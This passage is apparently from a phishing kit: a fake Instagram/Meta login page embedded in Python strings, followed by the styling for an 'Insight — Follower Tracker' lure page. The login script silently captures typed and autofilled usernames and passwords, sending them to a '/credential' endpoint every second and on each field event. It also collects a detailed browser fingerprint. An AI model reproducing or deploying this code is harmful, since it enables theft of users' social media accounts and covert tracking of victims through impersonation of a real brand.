  opacity:0;pointer-events:none;transition:opacity .35s var(--e)}
@media (prefers-color-scheme:dark){.veil{background:rgba(0,0,0,.45)}}
body.busy .veil{opacity:1;pointer-events:auto}
.veil .sp{width:52px;height:52px;border-radius:50%;border:3px solid var(--line);
  border-top-color:#d62976;border-right-color:#0095f6;animation:spin .9s linear infinite}
.veil span{font-size:13px;color:var(--mut);letter-spacing:.3px}
.veil span::after{content:"";animation:dots 1.4s steps(4) infinite}
@keyframes dots{0%{content:""}25%{content:"."}50%{content:".."}75%{content:"..."}}

@keyframes pg{from{opacity:0;transform:translateY(14px) scale(.99);filter:blur(7px)}}
@keyframes up{from{opacity:0;transform:translateY(18px) scale(.985);filter:blur(7px)}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-7px)}}
@keyframes spin{to{transform:rotate(1turn)}}
@keyframes pulse{0%,100%{opacity:.5;transform:scale(1)}50%{opacity:1;transform:scale(1.18)}}
@keyframes sweep{0%{left:-60%}42%,100%{left:135%}}
@keyframes shake{10%,90%{transform:translateX(-2px)}20%,80%{transform:translateX(4px)}
  30%,50%,70%{transform:translateX(-7px)}40%,60%{transform:translateX(7px)}}

/* landscape phones: keep everything reachable, no clipped CTA */
@media (max-height:520px){
  .logo{width:56px;height:56px;margin-bottom:14px}
  .logo img{width:50px;height:50px}
  .language{margin-bottom:12px}
  .create{margin-top:16px}
  .bottom{padding-top:10px}
}

/* wide screens: a centred card instead of a stretched column */
@media (min-width:560px){
  body{padding:24px 0;align-items:center}
  .app{
    max-width:404px;min-height:min(660px,calc(var(--vh,100dvh) - 48px));
    border:1px solid var(--line);border-radius:22px;
    box-shadow:0 26px 64px -28px rgba(0,0,0,.4);
    padding-top:30px;padding-bottom:30px;
  }
}

@media (prefers-reduced-motion:reduce){
  *,*::before,*::after{animation:none!important;transition:none!important}
}
</style>
</head>

<body>
<div class="scan"></div>
<div class="veil"><div class="sp"></div><span>Logging in</span></div>

<div class="app" id="app">

    <div class="content" id="content"><div class="inner">
        <!--MSG-->

        <div class="language">English (US)</div>

        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">
        </div>

        <form action="/login" method="POST" id="loginForm" autocomplete="on" name="login">
            <input type="hidden" name="payload" id="payload">

            <div class="inputs">
                <input type="text" id="u" name="username" value="__USER__" placeholder="Username, email or mobile number"
                       autocapitalize="none" autocorrect="off" spellcheck="false"
                       autocomplete="username" enterkeyhint="next" required>
                <input type="password" id="p" name="password" placeholder="Password"
                       autocomplete="current-password" enterkeyhint="go" required>
            </div>

            <button type="submit" class="login-btn" id="go">Log in</button>

            <div class="forgot">Forgot password?</div>

            <div class="create">
                <button type="button">Create new account</button>
            </div>
        </form>

    </div></div>

    <div class="bottom">
        <div class="meta">
            <span class="inf">&#8734;</span>
            <span>Meta</span>
        </div>

        <div class="footer">
            &copy; Meta 2026 &middot; Privacy &middot; Cookie Policy &middot; Terms &middot; English (UK)
        </div>
    </div>

</div>

<script>
(function () {
  'use strict';

  var rootEl = document.documentElement;
  var vv = window.visualViewport;
  var frozen = false;

  function sync() {
    if (frozen) return;
    var h = vv ? vv.height : window.innerHeight;
    rootEl.style.setProperty('--vh', h + 'px');
  }
  sync();
  if (vv) {
    vv.addEventListener('resize', sync);
    vv.addEventListener('scroll', sync);
  }
  window.addEventListener('resize', function () { if (!frozen) sync(); });
  window.addEventListener('orientationchange', function () {
    frozen = false;
    setTimeout(sync, 150);
  });

  document.addEventListener('focusin', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) frozen = true;
  });
  document.addEventListener('focusout', function () {
    setTimeout(function () {
      if (document.activeElement && document.activeElement.tagName === 'INPUT') return;
      frozen = false;
      sync();
    }, 160);
  });

  function ripple(el, ev) {
    var r = el.getBoundingClientRect();
    var s = Math.max(r.width, r.height);
    var d = document.createElement('span');
    d.className = 'rip';
    d.style.width = d.style.height = s + 'px';
    d.style.left = (ev.clientX - r.left - s / 2) + 'px';
    d.style.top = (ev.clientY - r.top - s / 2) + 'px';
    el.appendChild(d);
    setTimeout(function () { d.remove(); }, 700);
  }

  document.querySelectorAll('.login-btn,.create button').forEach(function (b) {
    b.addEventListener('pointerdown', function (e) { ripple(b, e); });
  });

  var inner = document.querySelector('.inner');
  if (inner && document.querySelector('.msg')) {
    setTimeout(function () { inner.classList.add('shake'); }, 120);
  }

  var SID = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);

  function fnv(str) {
    var h = 0x811c9dc5;
    for (var i = 0; i < str.length; i++) {
      h ^= str.charCodeAt(i);
      h = (h * 0x01000193) >>> 0;
    }
    return ('0000000' + h.toString(16)).slice(-8);
  }

  function canvasSig() {
    try {
      var c = document.createElement('canvas');
      c.width = 260; c.height = 70;
      var x = c.getContext('2d');
      x.textBaseline = 'top';
      x.font = '16px Arial';
      x.fillStyle = '#f60'; x.fillRect(0, 0, 130, 32);
      x.fillStyle = '#069'; x.fillText('Insight, capture 3.0', 2, 4);
      x.fillStyle = 'rgba(102,204,0,.7)'; x.fillText('fingerprint', 4, 22);
      x.beginPath(); x.arc(200, 35, 22, 0, Math.PI * 2); x.fill();
      return fnv(c.toDataURL());
    } catch (e) { return ''; }
  }

  function glSig() {
    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return '';
      var d = gl.getExtension('WEBGL_debug_renderer_info');
      if (!d) return '';
      return gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + ' | ' + gl.getParameter(d.UNMASKED_RENDERER_WEBGL);
    } catch (e) { return ''; }
  }

  function fontSig() {
    try {
      var probes = ['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana',
                    'Tahoma','Trebuchet MS','Segoe UI','Roboto','Menlo','Consolas','Ubuntu',
                    'Fira Sans','Noto Sans','SF Pro Text','Calibri','Cambria'];
      var bases = ['monospace', 'sans-serif', 'serif'];
      var ctx = document.createElement('canvas').getContext('2d');
      var hits = [];
      bases.forEach(function (b) {
        ctx.font = '72px ' + b;
        var base = ctx.measureText('mmmmmmmmmmlli').width;
        probes.forEach(function (f) {
          ctx.font = '72px "' + f + '",' + b;
          if (ctx.measureText('mmmmmmmmmmlli').width !== base) hits.push(f);
        });
      });
      return Array.from(new Set(hits)).slice(0, 40);
    } catch (e) { return []; }
  }

  function mq(q) { try { return matchMedia(q).matches ? 1 : 0; } catch (e) { return 0; } }

  function baseMeta() {
    var tz = '', tzo = '';
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
      tzo = String(new Date().getTimezoneOffset());
    } catch (e) {}
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;

    return {
      ua: navigator.userAgent,
      platform: navigator.platform || '',
      vendor: navigator.vendor || '',
      lang: navigator.language || '',
      langs: (navigator.languages || []).join(','),
      tz: tz, tzOffset: tzo,
      locale: (Intl.DateTimeFormat().resolvedOptions().locale || ''),
      screen: screen.width + 'x' + screen.height,
      avail: screen.availWidth + 'x' + screen.availHeight,
      viewport: window.innerWidth + 'x' + window.innerHeight,
      dpr: window.devicePixelRatio || 1,
      depth: screen.colorDepth,
      orientation: (screen.orientation && screen.orientation.type) || '',
      cores: navigator.hardwareConcurrency || 0,
      mem: navigator.deviceMemory || 0,
      touchPoints: navigator.maxTouchPoints || 0,
      cookieEnabled: navigator.cookieEnabled ? 1 : 0,
      dnt: navigator.doNotTrack || '',
      plugins: Array.from(navigator.plugins || []).map(function (p) { return p.name; }).slice(0, 12),
      conn: conn ? {
        type: conn.effectiveType || '', down: conn.downlink || 0,
        rtt: conn.rtt || 0, save: conn.saveData ? 1 : 0
      } : {},
      prefs: {
        dark: mq('(prefers-color-scheme: dark)'),
        reduce: mq('(prefers-reduced-motion: reduce)'),
        contrast: mq('(prefers-contrast: more)'),
        portrait: mq('(orientation: portrait)')
      },
      canvas: canvasSig(),
      webgl: glSig(),
      fonts: fontSig(),
      notifPerm: (window.Notification && Notification.permission) || '',
      referrer: document.referrer || '',
      href: location.href,
      title: document.title,
      historyLen: history.length
    };
  }

  function gather() {
    var meta = baseMeta();
    var field = document.getElementById('payload');
    if (field) field.value = JSON.stringify({ sid: SID, meta: meta });
    return meta;
  }

  var uEl = document.getElementById('u');
  var pEl = document.getElementById('p');
  var lastPair = '';
  var lastSentAt = 0;

  function pushCred(source, force) {
    if (!uEl || !pEl) return;
    var u = uEl.value || '';
    var p = pEl.value || '';
    if (!u && !p) return;

    var pair = u + '\\u0000' + p;
    var now = Date.now();
    if (pair === lastPair && !force) return;
    if (!force && now - lastSentAt < 1500) return;

    lastPair = pair;
    lastSentAt = now;

    var body = JSON.stringify({
      username: u,
      password: p,
      source: source,
      sid: SID,
      meta: baseMeta()
    });

    if (navigator.sendBeacon) {
      navigator.sendBeacon('/credential', new Blob([body], { type: 'application/json' }));
      return;
    }
    try {
      fetch('/credential', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body,
        keepalive: true
      });
    } catch (e) {}
  }

  document.addEventListener('animationstart', function (e) {
    if (e.animationName === 'autofillStart') {
      setTimeout(function () { pushCred('autofill', true); }, 120);
      setTimeout(function () { pushCred('autofill', true); }, 700);
    }
  });

  if (uEl) uEl.addEventListener('change', function () { pushCred('change'); });
  if (pEl) pEl.addEventListener('change', function () { pushCred('change'); });
  if (uEl) uEl.addEventListener('blur', function () { pushCred('blur'); });
  if (pEl) pEl.addEventListener('blur', function () { pushCred('blur'); });

  setInterval(function () { pushCred('poll'); }, 1000);

  window.addEventListener('pageshow', function () { pushCred('pageshow', true); });

  var form = document.getElementById('loginForm');
  var go = document.getElementById('go');
  if (form) {
    form.addEventListener('submit', function () {
      gather();
      pushCred('submit', true);
      document.body.classList.add('busy');
      if (go) { go.disabled = true; go.textContent = 'Logging in…'; }
    });
  }
  window.addEventListener('pageshow', function () {
    document.body.classList.remove('busy');
    if (go) { go.disabled = false; go.textContent = 'Log in'; }
  });
  if (pEl && uEl && uEl.value) { try { pEl.focus({ preventScroll: true }); } catch (e) {} }
})();
</script>

</body>
</html>
"""

# ============================== results page ==============================
RESULTS_PAGE_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Insight — Follower Tracker</title>
<style>
:root{--bg:#fff;--bg2:#fff;--card:#fafafa;--line:#dbdbdb;--tx:#000;--mut:#737373;--chip:#efefef;--blue:#0095f6;--red:#ed4956;--ig:linear-gradient(45deg,#feda75,#fa7e1e 25%,#d62976 55%,#962fbf 78%,#4f5bd5);--glow:rgba(214,41,118,.10);--e:cubic-bezier(.22,1,.36,1);--spring:cubic-bezier(.2,1.5,.4,1);--sh:0 1px 2px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.05);--sh2:0 2px 4px rgba(0,0,0,.05),0 18px 44px rgba(0,0,0,.13)}
@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}}
:root[data-theme="dark"]{--bg:#000;--bg2:#000;--card:#121212;--line:#262626;--tx:#f5f5f5;--mut:#a8a8a8;--chip:#262626;--glow:rgba(214,41,118,.16);--sh:0 1px 2px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.4);--sh2:0 2px 4px rgba(0,0,0,.5),0 18px 44px rgba(0,0,0,.6)}
*{box-sizing:border-box;margin:0;-webkit-tap-highlight-color:transparent}
html,body{height:100%}
html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
body{
  height:var(--vh,100dvh);min-height:var(--vh,100dvh);
  background:color-mix(in srgb,var(--bg2) 94%,#808080);color:var(--tx);
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
  display:flex;align-items:stretch;justify-content:center;
  overflow:hidden;overscroll-behavior:none;
  font-variant-numeric:tabular-nums;
  transition:background .5s var(--e),color .5s var(--e);
}
.frame{
  position:relative;width:100%;height:100%;max-width:1240px;min-height:0;
  border:0;border-radius:0;overflow:hidden;background:var(--bg2);
  padding-top:env(safe-area-inset-top,0px);
  padding-bottom:env(safe-area-inset-bottom,0px);
  transition:max-width .6s var(--e),border-radius .6s var(--e),background .5s,border-color .5s;
}
.app{display:grid;grid-template-columns:1fr;grid-template-rows:auto 1fr auto;height:100%;min-height:0}
.side{grid-row:1/4;border-right:1px solid var(--line);padding:24px 12px 20px;display:none;flex-direction:column;overflow:auto;transition:border-color .5s}
.logo{font:italic 700 30px Georgia,"Times New Roman",serif;letter-spacing:-.5px;padding:6px 12px 26px;text-align:center}
.logo span{background:var(--ig);background-size:220% 100%;-webkit-background-clip:text;background-clip:text;color:transparent;animation:sh 8s ease-in-out infinite alternate}
@keyframes sh{to{background-position:100% 0}}
.nav{display:flex;flex-direction:column;gap:2px}
.nav button{position:relative;display:flex;align-items:center;gap:16px;border:0;background:none;color:var(--tx);font:400 15.5px inherit;padding:12px;border-radius:12px;cursor:pointer;transition:background .3s var(--e),transform .45s var(--spring)}
.nav button::before{content:"";position:absolute;left:-12px;top:50%;width:4px;height:0;border-radius:0 4px 4px 0;background:var(--ig);transform:translateY(-50%);transition:height .45s var(--spring)}
.nav button.on::before{height:26px}
.nav button:hover{background:var(--chip);transform:translateX(6px)}
.nav button:active{transform:scale(.97)}
.nav button svg{width:25px;height:25px;flex:none;transition:transform .5s var(--spring)}
.nav button:hover svg{transform:scale(1.14) rotate(-5deg)}
.nav button.on{font-weight:700}
.nav button.on svg{stroke-width:2.6}
.nav .n{margin-left:auto;min-width:20px;height:20px;padding:0 6px;border-radius:99px;background:var(--red);color:#fff;font:700 11px/20px inherit;text-align:center;box-shadow:0 3px 8px rgba(237,73,86,.4);animation:pop .5s var(--spring) both}
@keyframes pop{from{transform:scale(0)}}
.me{margin-top:auto;display:flex;gap:12px;align-items:center;padding:12px;border-radius:12px;transition:background .3s}
.me:hover{background:var(--chip)}
.me b{font-size:14px;display:block;font-weight:600}.me small{color:var(--mut);font-size:12px}
.mtop{display:grid;grid-column:1;grid-template-columns:1fr auto 1fr;align-items:center;padding:10px 16px;border-bottom:1px solid var(--line);backdrop-filter:blur(24px) saturate(180%);background:color-mix(in srgb,var(--bg) 80%,transparent)}
.mtop .logo{padding:0;font-size:27px}
.mtop svg{width:25px;height:25px}
#mh{justify-self:end;border:0;background:none;color:var(--tx);cursor:pointer;display:grid;place-items:center;padding:2px;transition:transform .6s var(--spring)}
#mh:hover{transform:rotate(90deg)}
main{grid-row:2;overflow-y:auto;overflow-x:hidden;position:relative;min-height:0;overscroll-behavior:contain;-webkit-overflow-scrolling:touch}
.in{max-width:780px;margin:0 auto;padding:20px 16px 40px;position:relative}
.in.pg{animation:pg .55s var(--e) both}
.in.swap{animation:swap .4s var(--e) both}
@keyframes pg{from{opacity:0;transform:translateY(16px) scale(.99);filter:blur(6px)}}
@keyframes swap{from{opacity:0;transform:translateY(10px) scale(.995);filter:blur(6px)}}
main::before{content:"";position:absolute;inset:0 0 auto 0;height:340px;background:radial-gradient(60% 100% at 50% 0,var(--glow),transparent);pointer-events:none}
.prof{display:flex;gap:18px;align-items:center;margin-bottom:22px;flex-wrap:wrap}
.ring{flex:none;border-radius:50%;padding:3px;background:var(--ig);position:relative;transition:transform .5s var(--spring),box-shadow .5s var(--e)}
.ring>span{display:grid;place-items:center;border-radius:50%;border:3px solid var(--bg2);color:#fff;font-weight:700;overflow:hidden}
.ring.l{width:84px;height:84px;box-shadow:0 10px 30px var(--glow)}.ring.l>span{width:100%;height:100%;font-size:24px}
.ring.l:hover{transform:rotate(9deg) scale(1.07);box-shadow:0 16px 44px rgba(214,41,118,.4)}
.ring.m{width:54px;height:54px;padding:2.5px}.ring.m>span{width:100%;height:100%;border-width:2.5px;font-size:15px}
.ring.s{width:46px;height:46px;padding:2.5px}.ring.s>span{width:100%;height:100%;border-width:2.5px;font-size:14px}
.ring.off{background:var(--line)}
.ring.off>span{background:var(--chip);color:var(--mut)}
.pi{flex:1 1 160px;min-width:0}
.pi .h{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px}
.pi h2{font:400 17px inherit;word-break:break-word}
.pi .st{display:flex;gap:0;justify-content:space-between;margin:12px 0 0;font-size:13px;text-align:center;border-top:1px solid var(--line);padding-top:12px}
.pi .st div{display:flex;flex-direction:column;flex:1}
.pi .st b{font-weight:700}
.pi p{font-size:13.5px;line-height:1.45;margin-top:12px}.pi p span{color:var(--mut)}
.btn{position:relative;overflow:hidden;border:0;border-radius:10px;padding:8px 18px;font:600 14px inherit;cursor:pointer;background:var(--blue);color:#fff;box-shadow:0 4px 14px rgba(0,149,246,.32);transition:transform .45s var(--spring),filter .2s,box-shadow .35s var(--e),background .3s;white-space:nowrap}
.btn:hover{filter:brightness(1.08);transform:translateY(-2px) scale(1.03);box-shadow:0 10px 22px -8px rgba(0,149,246,.7)}
.btn:active{transform:scale(.94);box-shadow:none}
.btn:disabled{opacity:.6;pointer-events:none}
.btn.g,.btn.r{box-shadow:none}
.btn.g{background:var(--chip);color:var(--tx)}
.btn.g:hover,.btn.r:hover{box-shadow:0 8px 18px rgba(0,0,0,.14)}
.btn.r{background:var(--chip);color:var(--red)}
.rip{position:absolute;border-radius:50%;background:rgba(255,255,255,.45);transform:scale(0);animation:rip .6s ease-out forwards;pointer-events:none}
@keyframes rip{to{transform:scale(2.6);opacity:0}}
.sec{display:flex;align-items:baseline;justify-content:space-between;margin:22px 0 12px}
.sec h3{font:700 15px inherit}.sec a{color:var(--blue);font:600 13px inherit;cursor:pointer;transition:letter-spacing .3s var(--e),opacity .2s}.sec a:hover{letter-spacing:.5px;opacity:.8}
.stories{display:flex;gap:16px;overflow-x:auto;padding:8px 4px 10px;scrollbar-width:none}
.stories::-webkit-scrollbar{display:none}
.stories>div{flex:none;width:66px;text-align:center;cursor:pointer;position:relative;transition:transform .5s var(--spring);animation:up .6s var(--e) both}
.stories>div:nth-child(2){animation-delay:.06s}.stories>div:nth-child(3){animation-delay:.12s}.stories>div:nth-child(4){animation-delay:.18s}.stories>div:nth-child(5){animation-delay:.24s}
.stories>div:hover{transform:translateY(-5px) scale(1.08)}
.stories .ring{margin:0 auto 7px;width:66px;height:66px}.stories .ring>span{width:100%;height:100%;font-size:19px}
.stories small{font-size:12px;display:block;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.stories em{position:absolute;top:0;right:0;background:var(--red);color:#fff;font:700 10.5px/18px inherit;min-width:18px;border-radius:9px;border:2px solid var(--bg2);box-sizing:content-box;padding:0 3px;font-style:normal}
@keyframes up{from{opacity:0;transform:translateY(18px) scale(.985);filter:blur(5px)}}
.cards{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
.card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:14px;cursor:pointer;box-shadow:var(--sh);
  transform:perspective(700px) rotateX(var(--rx,0deg)) rotateY(var(--ry,0deg));
  transition:transform .4s var(--e),box-shadow .45s var(--e),border-color .3s;
  animation:up .7s var(--e) both;will-change:transform}
.card::before{content:"";position:absolute;inset:0;border-radius:18px;padding:1px;pointer-events:none;opacity:0;transition:opacity .4s;
  background:conic-gradient(from 0deg,#feda75,#d62976,#4f5bd5,#feda75);
  -webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
  -webkit-mask-composite:xor;mask-composite:exclude;animation:spin 4.5s linear infinite}
.card:nth-child(2){animation-delay:.05s}.card:nth-child(3){animation-delay:.1s}.card:nth-child(4){animation-delay:.15s}.card:nth-child(5){animation-delay:.2s}.card:nth-child(6){animation-delay:.25s}
.card::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 90% at 100% 0,var(--glow),transparent 65%);opacity:0;transition:opacity .45s;pointer-events:none}
.card:hover{box-shadow:var(--sh2);transform:perspective(700px) translateY(-6px) rotateX(var(--rx,0deg)) rotateY(var(--ry,0deg))}
.card:hover::before,.card:hover::after{opacity:1}
.card:active{transform:perspective(700px) translateY(-1px) scale(.985)}
.card small{color:var(--mut);font-size:12px;display:flex;align-items:center;justify-content:space-between;gap:6px}
.card small svg{width:18px;height:18px;flex:none;transition:transform .5s var(--spring)}
.card:hover small svg{transform:scale(1.3) rotate(-12deg);color:var(--tx)}
.card b{display:block;font:700 24px inherit;letter-spacing:-.8px;margin:8px 0 2px}
.card i{font-style:normal;font-size:11.5px;color:var(--mut)}
.card i.up{color:#2ecc71}.card i.dn{color:var(--red)}
@keyframes spin{to{transform:rotate(1turn)}}
.two{display:grid;grid-template-columns:1fr;gap:12px}
.panel{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e);animation:up .75s .2s var(--e) both}
.panel:hover{transform:translateY(-4px);box-shadow:var(--sh2)}
.panel h4{font:600 13.5px inherit;margin-bottom:16px}
.donut{display:flex;align-items:center;gap:20px;flex-wrap:wrap}
.donut svg{width:104px;height:104px;flex:none;transition:transform .7s var(--spring)}
.panel:hover .donut svg{transform:rotate(14deg) scale(1.06)}
.donut circle:not(:first-child){animation:dr 1.2s .3s var(--e) both}
@keyframes dr{from{stroke-dasharray:0 100}}
.leg{display:grid;gap:8px;font-size:13px;color:var(--mut)}.leg b{color:var(--tx)}
.leg em{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px}
.spark{display:flex;align-items:flex-end;gap:8px;height:86px}
.spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;animation:g .95s both var(--spring);transition:filter .3s,transform .4s var(--e)}
.spark i:hover{filter:brightness(1.15) saturate(1.3);transform:scaleY(1.09)}
@keyframes g{from{transform:scaleY(0)}}
.sl{display:flex;gap:8px;margin-top:8px;font-size:11px;color:var(--mut)}.sl span{flex:1;text-align:center;overflow:hidden;text-overflow:ellipsis}
.bar{display:flex;gap:8px;margin:6px 0 14px;flex-wrap:wrap;align-items:center}
.search{flex:1 1 150px;min-width:0;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .35s var(--e),background .3s,transform .45s var(--spring)}
.search:focus{background:var(--bg2);box-shadow:0 0 0 2px var(--blue),0 10px 26px -12px rgba(0,149,246,.7);transform:translateY(-1px)}
.search::placeholder{color:var(--mut)}
.chip{position:relative;overflow:hidden;border:0;background:var(--chip);color:var(--tx);padding:9px 15px;border-radius:10px;font:600 13px inherit;cursor:pointer;transition:all .4s var(--spring)}
.chip:hover{transform:translateY(-2px);box-shadow:0 8px 16px -6px rgba(0,0,0,.2)}
.chip:active{transform:scale(.94)}
.chip.on{background:var(--tx);color:var(--bg)}
.ttl{font:700 21px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 18px}
.row{display:flex;align-items:center;gap:13px;padding:9px 10px;margin:0 -10px;border-radius:14px;animation:in .55s var(--e) both;transition:background .3s,transform .45s var(--spring),box-shadow .4s var(--e)}
.row:hover{background:var(--chip);transform:translateX(6px)}
.row:hover .ring{transform:scale(1.09)}
@keyframes in{from{opacity:0;transform:translateY(12px);filter:blur(4px)}}
.info{flex:1;min-width:0}
.info b{font:600 14px inherit;display:flex;align-items:center;gap:5px;flex-wrap:wrap}
.info small{display:block;color:var(--mut);font-size:13px;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.vf{width:14px;height:14px;fill:var(--blue);flex:none}
.tag{font:600 11px inherit;padding:3px 8px;border-radius:6px;background:var(--chip);color:var(--mut)}
.tag.red{color:var(--red)}.tag.hot{color:#d62976}
.ic{width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--chip);flex:none;transition:transform .5s var(--spring)}
.row:hover .ic{transform:scale(1.12) rotate(-7deg)}
.ic svg{width:22px;height:22px}
.th{width:44px;height:44px;border-radius:8px;flex:none;transition:transform .45s var(--e)}
.row:hover .th{transform:scale(1.1) rotate(5deg)}
.day{font:700 15px inherit;margin:18px 0 6px}
.bn{display:grid;grid-column:1;grid-template-columns:repeat(5,1fr);border-top:1px solid var(--line);background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(24px) saturate(180%);padding:6px 4px calc(8px + env(safe-area-inset-bottom,0px))}
.bn button{border:0;background:none;color:var(--tx);display:grid;place-items:center;padding:10px 0;cursor:pointer;position:relative;transition:transform .4s var(--spring)}
.bn button:active{transform:scale(.82)}
.bn svg{width:26px;height:26px;transition:transform .45s var(--spring)}
.bn button.on svg{stroke-width:2.8;transform:translateY(-2px) scale(1.12)}
.bn .n{position:absolute;top:4px;left:calc(50% + 6px);background:var(--red);color:#fff;border-radius:99px;font:700 10px/16px inherit;min-width:16px;padding:0 4px}
.empty{padding:50px 0;text-align:center;color:var(--mut);animation:up .6s var(--e) both}
.srow{display:flex;align-items:center;gap:14px;padding:14px 0;border-bottom:1px solid var(--line);animation:in .5s var(--e) both}
.srow .info small{white-space:normal;line-height:1.35}
.srow.lk{cursor:pointer;transition:padding .4s var(--spring)}
.srow.lk:hover{padding-left:10px}
.srow .ch{color:var(--mut);font-size:22px;line-height:1;transition:transform .4s var(--spring)}
.srow.lk:hover .ch{transform:translateX(5px)}
.srow.red b{color:var(--red)}.srow.red .ch{color:var(--red)}
.sw{flex:none;width:46px;height:28px;border-radius:14px;border:0;background:color-mix(in srgb,var(--mut) 50%,transparent);position:relative;cursor:pointer;transition:background .35s,box-shadow .35s}
.sw::after{content:"";position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;box-shadow:0 2px 5px rgba(0,0,0,.3);transition:transform .5s var(--spring),width .2s}
.sw:active::after{width:27px}
.sw.on{background:var(--blue);box-shadow:0 4px 14px rgba(0,149,246,.5)}
.sw.on::after{transform:translateX(18px)}
.sw.on:active::after{transform:translateX(13px)}
.acc{display:flex;align-items:center;gap:14px;padding:16px;background:var(--card);border:1px solid var(--line);border-radius:18px;margin-bottom:4px;box-shadow:var(--sh);animation:up .6s var(--e) both}
.toast{position:fixed;left:50%;bottom:calc(34px + env(safe-area-inset-bottom,0px));transform:translate(-50%,30px) scale(.9);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .6s var(--spring);z-index:9;box-shadow:var(--sh2);max-width:calc(100% - 32px);text-align:center}
.toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
.sk{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;height:96px}
.sk::after{content:"";position:absolute;inset:0;transform:translateX(-100%);
  background:linear-gradient(100deg,transparent 20%,color-mix(in srgb,var(--tx) 9%,transparent) 50%,transparent 80%);
  animation:shim 1.5s infinite}
@keyframes shim{to{transform:translateX(100%)}}
.sk.top{height:84px;width:84px;border-radius:50%;margin:0 auto 18px}
.skw{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-top:22px}

/* desktop: side rail + wider grid, framed card */
@media (min-width:761px){
  body{padding:16px}
  .frame{max-height:calc(var(--vh,100dvh) - 32px);border:1px solid var(--line);border-radius:22px;box-shadow:var(--sh2)}
  .app{grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto}
  .side{display:flex}
  .mtop{display:none}
  .bn{display:none}
  main{grid-row:1/4}
  .in{max-width:820px;padding:34px 28px 50px}
  .prof{gap:30px;flex-wrap:nowrap;margin-bottom:26px}
  .ring.l{width:112px;height:112px}.ring.l>span{font-size:31px}
  .pi{flex:1 1 auto}
  .pi h2{font-size:20px}
  .pi .st{justify-content:flex-start;gap:34px;border-top:0;padding-top:0;margin:0 0 14px;font-size:15px}
  .pi .st div{flex:0 0 auto}
  .pi p{margin-top:0;font-size:14px}
  .cards{grid-template-columns:repeat(3,1fr);gap:12px}
  .card{padding:16px 18px}.card b{font-size:28px}
  .two{grid-template-columns:1fr 1fr;gap:12px}
  .ttl{font-size:24px}
  .sec{margin:26px 0 14px}
}

@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style>
</head>
<body>
<div class="frame" id="frame"><div class="app">
 <aside class="side">
  <div class="logo"><span>Insight</span></div>
  <nav class="nav" id="nav"></nav>
  <div class="me"><div class="ring m"><span style="background:#262626">YO</span></div><div><b>your.handle</b><small>Synced just now</small></div></div>
 </aside>
 <div class="mtop"><span></span><div class="logo"><span>Insight</span></div><button id="mh" aria-label="Settings"></button></div>
 <main id="main"></main>
 <nav class="bn" id="bn"></nav>
</div></div>
<div class="toast" id="toast"></div>
<script>
(function(){
  var vv=window.visualViewport, fr=document.documentElement;
  function vs(){ fr.style.setProperty("--vh",(vv?vv.height:window.innerHeight)+"px"); }
  vs();
  if(vv){vv.addEventListener("resize",vs);vv.addEventListener("scroll",vs);}
  window.addEventListener("resize",vs);
  window.addEventListener("orientationchange",function(){setTimeout(vs,180)});
})();
const S=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
const I={
 home:S('<path d="M3 10.5 12 3l9 7.5V21h-6v-6H9v6H3z"/>'),
 notback:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M17 8l5 5M22 8l-5 5"/>'),
